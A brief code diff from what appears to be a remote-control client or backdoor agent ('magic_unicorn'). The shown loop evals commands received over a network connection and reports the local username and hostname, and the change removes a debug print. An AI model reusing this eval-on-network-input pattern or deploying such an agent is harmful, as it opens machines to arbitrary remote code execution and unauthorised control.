@@ -164,7 +164,6 @@ class magic_unicorn:
             command = unicorn.recv()
             if command.strip():
                 command = eval(command.decode("UTF-8", "ignore").strip())
-                print(command)
                 if command[0] == "username":
                     unicorn.send(getpass.getuser().encode("UTF-8"))
                 elif command[0] == "hostname":
